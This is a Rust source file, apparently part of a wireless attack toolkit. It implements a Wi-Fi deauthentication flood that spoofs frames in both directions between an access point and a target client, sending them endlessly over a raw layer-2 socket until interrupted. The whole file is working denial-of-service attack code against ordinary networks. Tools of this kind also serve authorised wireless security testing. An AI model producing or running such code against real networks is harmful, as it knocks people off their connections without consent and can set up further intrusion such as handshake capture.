use std::{thread, time::{Duration, Instant}};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::DeauthArgs;
use crate::iface::{Iface, IfaceManager};
use crate::builders::DeauthFrame;
use crate::sockets::Layer2Socket;
use crate::utils::{CtrlCHandler, abort, Mac};




pub struct Deauthentication {
    builder    : DeauthFrame,
    frms_sent  : usize,
    seq_num    : u16,
    socket     : Layer2Socket,
    iface      : Iface,
    channel    : i32,
    ap_mac     : Mac,
    target_mac : Mac,
    delay      : u64
}


impl Deauthentication {

    pub fn new(args: DeauthArgs) -> Self {
        let ap_mac = Mac::from_slice(args.bssid.bytes());

        Self { 
            builder    : DeauthFrame::new(args.bssid),
            frms_sent  : 0,
            seq_num    : 1,
            socket     : Layer2Socket::new(&args.iface),
            iface      : args.iface,
            channel    : args.channel,
            target_mac : args.target_mac,
            delay      : args.delay,
            ap_mac,
        }
    }



    pub fn execute(&mut self) {
        self.set_channel();
        self.display_exec_info();
        self.send_endlessly();
    }



    fn set_channel(&self) {
        if !IfaceManager::set_channel(self.iface.name(), self.channel) {
            abort(
                format!(
                    "Uneable to set channel {} on interface {}", 
                    self.iface.name(), self.channel
                )
            )
        }
    }



    fn display_exec_info(&self) {
        println!("\n[*] BSSID...: {}", self.ap_mac.to_string());
        println!("[*] TARGET..: {}", self.target_mac.to_string());
        println!("[*] CHANNEL.: {}", self.channel);
    }



    fn send_endlessly(&mut self) {
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());
        
        let init = Instant::now();
        println!("\n[+] Sending frames. Press CTRL + C to stop");

        while running.load(Ordering::SeqCst) {
            self.send_frame(self.target_mac, self.ap_mac);
            self.send_frame(self.ap_mac, self.target_mac);
        }

        let time = init.elapsed().as_secs_f64();
    
        println!("\n[-] Flood interrupted");
        println!("[%] Frames sent: {} in {:.2}", self.frms_sent, time);
    }



    #[inline]
    fn send_frame(
        &mut self, 
        src_mac : Mac, 
        dst_mac : Mac, 
    ) {
        let frame = self.builder.frame(dst_mac, src_mac, self.seq_num);
        
        self.socket.send(frame);
        self.update_seq_num();
        self.frms_sent += 1;

        thread::sleep(Duration::from_millis(self.delay));
    }



    #[inline]
    fn update_seq_num(&mut self) {
        if self.seq_num >= 4095 {
            self.seq_num = 0;
        }

        self.seq_num += 1;
    }

}



impl crate::EngineTrait for Deauthentication {
    type Args = DeauthArgs;
    
    fn new(args: Self::Args) -> Self {
        Deauthentication::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}